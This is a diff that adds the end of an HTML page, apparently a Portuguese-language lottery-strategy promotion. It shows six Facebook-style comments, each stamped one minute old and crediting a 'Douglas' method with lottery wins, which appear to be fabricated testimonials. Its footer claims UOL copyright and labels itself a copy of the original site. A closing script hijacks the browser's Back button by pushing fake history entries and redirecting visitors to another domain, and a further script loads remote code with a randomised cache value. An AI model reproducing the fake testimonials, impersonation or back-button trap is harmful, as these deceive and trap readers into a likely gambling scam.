+border: none;
+opacity: 1;
+margin: 2vh 0 2vh 0;
+}
+@media (max-width: 1200px) {
+.divider-lrdKoN2899371-element {
+margin: 1.32vh 0 1.5vh 0;
+}
+}
+@media (max-width: 640px) {
+.divider-lrdKoN2899371-element {
+margin: 0.5vh 0 1vh 0;
+}
+}
+</style>
+<hr class="divider-lrdKoN2899371-element">
+</div>
+<style>.px-1{padding-left:4px;padding-right:4px}.pt-0.5{padding-top:2px}.mt-4{margin-top:16px}@media (min-width:640px){.sm\:text-sm{font-size:14px;line-height:20px}}.mt-2{margin-top:8px}.mb-2{margin-bottom:8px}.flex{display:flex}.w-full{width:100%}.space-x-1>:not([hidden])~:not([hidden]){margin-left:.25rem}.items-center{align-items:center}.font-\[Helvetica\]{font-family:Helvetica,Arial,sans-serif}.cursor-pointer{cursor:pointer}.rounded-full{border-radius:99999px}.h-12{height:48px}.w-12{width:48px}.flex-col{flex-direction:column}.py-1{padding-top:4px;padding-bottom:4px}.px-3{padding-left:12px;padding-right:12px}.pl-0\.5,.px-0\.5{padding-left:2px}.rounded-\[18px\]{border-radius:18px}.bg-stone-100{background-color:#f5f5f4}.px-0\.5{padding-right:2px}.font-semibold{font-weight:600}.text-\[\#365899\]{color:#365899}.text-\[13px\]{font-size:13px}.leading-4{line-height:16px}.hover\:underline:hover{text-decoration-line:underline}.text-sm{font-size:14px}.relative{position:relative}.justify-between{justify-content:space-between}.grow{flex-grow:1}.text-xs{font-size:12px}.text-\[\#90949c\]{color:#90949c}.ml-px{margin-left:1px}.gap-1{gap:4px}.w-fit{width:fit-content}.hidden{display:none}.-mt-1{margin-top:-4px}.-mt-2{margin-top:-8px}.mr-2{margin-right:8px}.h-4,.h-5{height:16px}.drop-shadow{--tw-drop-shadow:drop-shadow(0 1px 2px rgba(0, 0, 0, 0.1)) drop-shadow(0 1px 1px rgba(0, 0, 0, 0.06));filter:var(--tw-drop-shadow)}.bg-slate-50{background-color:#f8fafc}.py-0\.5{padding-top:2px;padding-bottom:2px}.pr-1{padding-right:4px}.block{display:block}.w-4{width:16px}.z-10{z-index:10}.-ml-1{margin-left:-4px}.ml-4{margin-left:16px}.gap-x-0\.5{column-gap:2px}.mr-0\.5{margin-right:2px;margin-left:2px}.border-l{border-left-width:1px}.border-slate-300{border-color:#cbd5e1}.border-dotted{border-style:dotted}.ml-5{margin-left:20px}.h-8{height:32px}.w-8{width:32px}.h-10{height:40px}.w-10{width:40px}@media (min-width:640px){.sm\:w-16{width:64px}.sm\:ml-12{margin-left:48px}}.pl-2{padding-left:8px}</style>
+<div class="fbComments-dPMaKu4532310" style="margin-left:auto;margin-right:auto">
+<style>
+.fbComments-dPMaKu4532310-element {
+padding: 16px;
+border-radius:20px;
+background-color:#fff;
+}
+.fbComments-dPMaKu4532310-element p, .fbComments-dPMaKu4532310-element span {
+font-family: 'Helvetica', 'Arial', sans-serif;
+}
+</style>
+<div id="testimonials" class="fbComments-dPMaKu4532310-element">
+<p class="text-xs sm:text-sm leading-4 font-semibold mb-2">
+Mostrando 6 comentários
+</p>
+<div class="mb-2">
+<div class="flex w-full space-x-1 items-center font-[Helvetica]">
+<img src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/l/xRIxen9288600.webp" class="cursor-pointer rounded-full h-10 w-10">
+<div class="flex w-full flex-col py-1 px-3 rounded-[18px] bg-stone-100">
+<div class="px-0.5 py-1">
+<p class="font-semibold text-[#365899] text-[13px] leading-4 cursor-pointer hover:underline">
+Marcio Campos
+</p>
+<p class="text-sm leading-4 pt-0.5">
+Parabéns e obrigado por nos passar seu jogo. Já ganhei algumas vezes aqui em <span class="md"></span> com sua estratégia. 👏👏👏👏👏
+</p>
+</div>
+</div>
+</div>
+<div class="flex w-full justify-between">
+<div class="w-12 sm:w-16"></div>
+<div class="grow flex gap-1 text-xs pt-0.5">
+<p class="font-semibold cursor-pointer hover:underline text-[#90949c]">
+Curtir
+</p>
+<p class="text-[#90949c]">·</p>
+<p class="font-semibold cursor-pointer hover:underline text-[#90949c]">
+Responder
+</p>
+<p class="text-[#90949c]">·</p>
+<div class="text-[#90949c] flex gap-x-0.5 cursor-pointer hover:underline">
+<p class="text-xs text-[#90949c]">
+1
+</p>
+<p class="text-[#90949c] ">min</p>
+</div>
+</div>
+<div class="-mt-2 mr-2 h-5 flex items-center relative drop-shadow rounded-full bg-slate-50 py-0.5 px-1 w-fit">
+<img class="w-4 block" data-cfsrc="https://media.atomicatpages.com/p/l.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 block" src="https://media.atomicatpages.com/p/l.png"></noscript>
+<img class="w-4 -ml-1 mr-0.5" data-cfsrc="https://media.atomicatpages.com/p/h.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 -ml-1 mr-0.5" src="https://media.atomicatpages.com/p/h.png"></noscript>
+<span class="text-xs text-[#90949c] pt-0.5">
+59
+</span>
+</div>
+</div>
+</div>
+<div class="mb-2">
+<div class="flex w-full space-x-1 items-center font-[Helvetica]">
+<img src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/l/yHfKxt9228992.webp" class="cursor-pointer rounded-full h-10 w-10">
+<div class="flex w-full flex-col py-1 px-3 rounded-[18px] bg-stone-100">
+<div class="px-0.5 py-1">
+<p class="font-semibold text-[#365899] text-[13px] leading-4 cursor-pointer hover:underline">
+Helen Maria
+</p>
+<p class="text-sm leading-4 pt-0.5">
+Fiz os 14 pontos e foi o que salvou o meu fim de ano Douglas.
+</p>
+</div>
+</div>
+</div>
+<div class="flex w-full justify-between">
+<div class="w-12 sm:w-16"></div>
+<div class="grow flex gap-1 text-xs pt-0.5">
+<p class="font-semibold cursor-pointer hover:underline text-[#90949c]">
+Curtir
+</p>
+<p class="text-[#90949c]">·</p>
+<p class="font-semibold cursor-pointer hover:underline text-[#90949c]">
+Responder
+</p>
+<p class="text-[#90949c]">·</p>
+<div class="text-[#90949c] flex gap-x-0.5 cursor-pointer hover:underline">
+<p class="text-xs text-[#90949c]">
+1
+</p>
+<p class="text-[#90949c] ">min</p>
+</div>
+</div>
+<div class="-mt-2 mr-2 h-5 flex items-center relative drop-shadow rounded-full bg-slate-50 py-0.5 px-1 w-fit">
+<img class="w-4 block" data-cfsrc="https://media.atomicatpages.com/p/l.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 block" src="https://media.atomicatpages.com/p/l.png"></noscript>
+<img class="w-4 -ml-1 mr-0.5" data-cfsrc="https://media.atomicatpages.com/p/h.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 -ml-1 mr-0.5" src="https://media.atomicatpages.com/p/h.png"></noscript>
+<span class="text-xs text-[#90949c] pt-0.5">
+20
+</span>
+</div>
+</div>
+</div>
+<div class="border-l border-slate-300 border-dotted ml-5 sm:ml-12 pl-2 mb-2">
+<div class="flex w-full space-x-1 items-center">
+<img src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/l/Idytvw9314243.webp" class="cursor-pointer rounded-full h-8 w-8">
+<div class="flex w-full flex-col py-1 px-3 rounded-[18px] bg-stone-100">
+<div class="px-0.5 py-1">
+<p class="font-semibold text-[#365899] text-xs cursor-pointer hover:underline">
+Aparecida da Silva
+</p>
+<p class="text-sm leading-4 pt-0.5">
+aqui também, se não fosse os ganhos na loto eu tinha passado no aperto
+</p>
+</div>
+</div>
+</div>
+<div class="flex w-full justify-between">
+<div class="w-10 sm:w-16"></div>
+<div class="grow flex gap-1 text-xs">
+<p class="font-semibold hover:underline cursor-pointer text-[#90949c]">
+Curtir
+</p>
+<p class="text-[#90949c]">·</p>
+<p class="font-semibold hover:underline cursor-pointer text-[#90949c]">
+Responder
+</p>
+<p class="text-[#90949c]">·</p>
+<div class="text-[#90949c] flex gap-x-0.5 cursor-pointer hover:underline">
+<p class="text-xs text-[#90949c]">
+1
+</p>
+<p class="text-[#90949c] ">min</p>
+</div>
+</div>
+<div class="-mt-2 mr-2 h-5 flex items-center relative drop-shadow rounded-full bg-slate-50 py-0.5 px-1 w-fit">
+<img class="w-4 block" data-cfsrc="https://media.atomicatpages.com/p/l.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 block" src="https://media.atomicatpages.com/p/l.png"></noscript>
+<img class="w-4 -ml-1 mr-0.5" data-cfsrc="https://media.atomicatpages.com/p/h.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 -ml-1 mr-0.5" src="https://media.atomicatpages.com/p/h.png"></noscript>
+<span class="text-xs text-[#90949c] pt-0.5">
+51
+</span>
+</div>
+</div>
+</div>
+<div class="mb-2">
+<div class="flex w-full space-x-1 items-center font-[Helvetica]">
+<img src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/l/Gvsfrq9196428.webp" class="cursor-pointer rounded-full h-10 w-10">
+<div class="flex w-full flex-col py-1 px-3 rounded-[18px] bg-stone-100">
+<div class="px-0.5 py-1">
+<p class="font-semibold text-[#365899] text-[13px] leading-4 cursor-pointer hover:underline">
+Alpherdo Salazar
+</p>
+<p class="text-sm leading-4 pt-0.5">
+Agora entendi porque eu nao conseguia fazer 14pontos nunca gratidao amigo 🙏🙏
+</p>
+</div>
+</div>
+</div>
+<div class="flex w-full justify-between">
+<div class="w-12 sm:w-16"></div>
+<div class="grow flex gap-1 text-xs pt-0.5">
+<p class="font-semibold cursor-pointer hover:underline text-[#90949c]">
+Curtir
+</p>
+<p class="text-[#90949c]">·</p>
+<p class="font-semibold cursor-pointer hover:underline text-[#90949c]">
+Responder
+</p>
+<p class="text-[#90949c]">·</p>
+<div class="text-[#90949c] flex gap-x-0.5 cursor-pointer hover:underline">
+<p class="text-xs text-[#90949c]">
+1
+</p>
+<p class="text-[#90949c] ">min</p>
+</div>
+</div>
+<div class="-mt-2 mr-2 h-5 flex items-center relative drop-shadow rounded-full bg-slate-50 py-0.5 px-1 w-fit">
+<img class="w-4 block" data-cfsrc="https://media.atomicatpages.com/p/l.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 block" src="https://media.atomicatpages.com/p/l.png"></noscript>
+<img class="w-4 -ml-1 mr-0.5" data-cfsrc="https://media.atomicatpages.com/p/h.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 -ml-1 mr-0.5" src="https://media.atomicatpages.com/p/h.png"></noscript>
+<span class="text-xs text-[#90949c] pt-0.5">
+42
+</span>
+</div>
+</div>
+</div>
+<div class="mb-2">
+<div class="flex w-full space-x-1 items-center font-[Helvetica]">
+<img src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/l/MMGcbY9217048.webp" class="cursor-pointer rounded-full h-10 w-10">
+<div class="flex w-full flex-col py-1 px-3 rounded-[18px] bg-stone-100">
+<div class="px-0.5 py-1">
+<p class="font-semibold text-[#365899] text-[13px] leading-4 cursor-pointer hover:underline">
+Simone dos Anjos
+</p>
+<p class="text-sm leading-4 pt-0.5">
+Alguém aqui é de <span class="md"></span> tambem?
+</p>
+</div>
+</div>
+</div>
+<div class="flex w-full justify-between">
+<div class="w-12 sm:w-16"></div>
+<div class="grow flex gap-1 text-xs pt-0.5">
+<p class="font-semibold cursor-pointer hover:underline text-[#90949c]">
+Curtir
+</p>
+<p class="text-[#90949c]">·</p>
+<p class="font-semibold cursor-pointer hover:underline text-[#90949c]">
+Responder
+</p>
+<p class="text-[#90949c]">·</p>
+<div class="text-[#90949c] flex gap-x-0.5 cursor-pointer hover:underline">
+<p class="text-xs text-[#90949c]">
+1
+</p>
+<p class="text-[#90949c] ">min</p>
+</div>
+</div>
+<div class="-mt-2 mr-2 h-5 flex items-center relative drop-shadow rounded-full bg-slate-50 py-0.5 px-1 w-fit">
+<img class="w-4 block" data-cfsrc="https://media.atomicatpages.com/p/l.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 block" src="https://media.atomicatpages.com/p/l.png"></noscript>
+<img class="w-4 -ml-1 mr-0.5" data-cfsrc="https://media.atomicatpages.com/p/h.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 -ml-1 mr-0.5" src="https://media.atomicatpages.com/p/h.png"></noscript>
+<span class="text-xs text-[#90949c] pt-0.5">
+87
+</span>
+</div>
+</div>
+</div>
+<div class="border-l border-slate-300 border-dotted ml-5 sm:ml-12 pl-2 mb-2">
+<div class="flex w-full space-x-1 items-center">
+<img src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/l/ALEzHu9239801.webp" class="cursor-pointer rounded-full h-8 w-8">
+<div class="flex w-full flex-col py-1 px-3 rounded-[18px] bg-stone-100">
+<div class="px-0.5 py-1">
+<p class="font-semibold text-[#365899] text-xs cursor-pointer hover:underline">
+Paulo José
+</p>
+<p class="text-sm leading-4 pt-0.5">
+eu sou de Caxias do Sul
+</p>
+</div>
+</div>
+</div>
+<div class="flex w-full justify-between">
+<div class="w-10 sm:w-16"></div>
+<div class="grow flex gap-1 text-xs">
+<p class="font-semibold hover:underline cursor-pointer text-[#90949c]">
+Curtir
+</p>
+<p class="text-[#90949c]">·</p>
+<p class="font-semibold hover:underline cursor-pointer text-[#90949c]">
+Responder
+</p>
+<p class="text-[#90949c]">·</p>
+<div class="text-[#90949c] flex gap-x-0.5 cursor-pointer hover:underline">
+<p class="text-xs text-[#90949c]">
+1
+</p>
+<p class="text-[#90949c] ">min</p>
+</div>
+</div>
+<div class="-mt-2 mr-2 h-5 flex items-center relative drop-shadow rounded-full bg-slate-50 py-0.5 px-1 w-fit">
+<img class="w-4 block" data-cfsrc="https://media.atomicatpages.com/p/l.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 block" src="https://media.atomicatpages.com/p/l.png"></noscript>
+<img class="w-4 -ml-1 mr-0.5" data-cfsrc="https://media.atomicatpages.com/p/h.png" style="display:none;visibility:hidden;"><noscript><img class="w-4 -ml-1 mr-0.5" src="https://media.atomicatpages.com/p/h.png"></noscript>
+<span class="text-xs text-[#90949c] pt-0.5">
+67
+</span>
+</div>
+</div>
+</div>
+<p class="text-xs sm:text-sm leading-4 font-semibold mt-4" style="color:#555;text-align:center;">
+Você precisa estar logado para comentar.
+</p>
+</div>
+</div>
+</div>
+</div>
+<div class="division-FtEuvz2857520__wrapper">
+<style>
+#division-FtEuvz2857520 {
+border: none;
+border-radius: ;
+margin: 0;
+position: relative;
+padding: 3vh 20vw 3vh 20vw;
+background-color: #ffffff;
+}
+@media (max-width:1200px) {
+#division-FtEuvz2857520 {
+padding: 2.25vh 15vw 2.25vh 15vw;
+margin: 0;
+}
+}
+@media (max-width:600px) {
+#division-FtEuvz2857520 {
+margin: 0;
+padding: 1.5vh 1.5vw 1.5vh 1.5vw;
+}
+}
+</style>
+<div id="division-FtEuvz2857520" class="xNSmQW9984923 ztFmCm0010858">
+<div class="image-uRQoaJ2568515">
+<style>
+.image-uRQoaJ2568515-element img {
+display: block;
+margin-left: auto;
+margin-right: auto;
+margin-bottom: 0.25vh;
+margin-top: 0.25vh;
+max-width: 30%;
+border-radius: 0;
+border: none;
+}
+@media (max-width: 1200px) {
+.image-uRQoaJ2568515-element img {
+max-width: 27%;
+}
+}
+@media (max-width: 600px) {
+.image-uRQoaJ2568515-element img {
+max-width: 40%;
+margin-left:auto;margin-right:auto;
+}
+}
+</style>
+<div class="image-uRQoaJ2568515-element">
+<img loading="lazy" data-cfsrc="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/Pictures/AivyLE2580166.png" alt style="display:none;visibility:hidden;"><noscript><img loading="lazy" src="https://media.atomicatpages.com/u/swAmSsHyGTXc9l4eem1zpXZJbIy1/Pictures/AivyLE2580166.png" alt></noscript>
+</div>
+</div>
+</div>
+</div>
+<div class="division-vpMWkb2003884__wrapper">
+<style>
+#division-vpMWkb2003884 {
+border: none;
+border-radius: ;
+margin: 8vh 0 0 0;
+position: relative;
+padding: 7vh 14vw 7vh 14vw;
+background-color: #000000;
+}
+@media (max-width:1200px) {
+#division-vpMWkb2003884 {
+padding: 5.25vh 10.5vw 5.25vh 10.5vw;
+margin: 8vh 0 0 0;
+}
+}
+@media (max-width:600px) {
+#division-vpMWkb2003884 {
+margin: 3vh 0 0 0;
+padding: 3vh 4.5vw 3vh 4.5vw;
+}
+}
+</style>
+<div id="division-vpMWkb2003884" class="qgpbux9984924">
+<div class="footer-AtXGul9814118">
+<style>
+.footer-AtXGul9814118-element {
+text-align: center;
+font-size: 0.80vw;
+color: #ffffff;
+}
+.footer-AtXGul9814118-element a {
+padding: 0 !important;
+color: #ffffff !important;
+}
+@media (max-width:1200px) {
+.footer-AtXGul9814118-element {
+text-align: center;
+font-size: 1.30vw;
+color: #ffffff;
+}
+}
+@media (max-width:640px) {
+.footer-AtXGul9814118-element {
+text-align: center;
+font-size: 2.20vw;
+color: #ffffff;
+}
+}
+</style>
+<footer class="footer-AtXGul9814118-element">
+<p><strong>Copyright 2024 – © Copyright 2000-2023 UOL Participações S.A. Copia do site original ®</strong></p>
+<p style="margin-top:4px;">Todos os Direitos Reservados</p>
+<div style="display:flex;align-items:center;justify-content:center;margin-top:24px;">
+<a id="t" style="margin-right:12px" href="#" target="_blank">
+Termos de Uso
+</a> <span style="margin-right:12px">·</span>
+<a id="p" href="#" target="_blank">
+Privacidade
+</a>
+</div>
+<p style="margin-top:24px;">
+</p>
+<script>
+          const pr = window.location.href + "privacidade",
+            te = window.location.href + "termos";
+            document.getElementById("p").setAttribute("href", pr), document.getElementById("t").setAttribute("href", te);
+</script>
+</footer></div>
+</div>
+</div>
+<script async src="https://player.pandavideo.com.br/api.v2.js"></script>
+<script src="/materiamais/js/ztFmCm0010858.js" charset="utf-8"></script>
+<script>document.addEventListener("DOMContentLoaded",(()=>{document.querySelectorAll("a").forEach((e=>{e.getAttribute("href").includes("#")||(e.getAttribute("href").includes("?")?e.setAttribute("href",e.getAttribute("href")+window.location.search.replace("?","&")):e.setAttribute("href",e.getAttribute("href")+window.location.search))}))}));</script>
+<script>var back_redirect_back_link="https://www.portalpodnews.com/fback/"+location.search;history.pushState({},"",location.href),history.pushState({},"",location.href),window.addEventListener("popstate",(function(t){t.state&&setTimeout((function(){location.href=back_redirect_back_link}),1)}),!1);</script>
+<script type="text/javascript">document.head.appendChild(Object.assign(document.createElement("script"), {src: "https://cdn.atomicatpages.com/a.js?cache=" + Math.floor((Math.random() * 100000)),async: true}));</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon='{"rayId":"84f074179d536030","version":"2024.2.0","token":"ef0707825bc44ac891f71e954cb732e3"}' crossorigin="anonymous"></script>
+</body>
+</html>
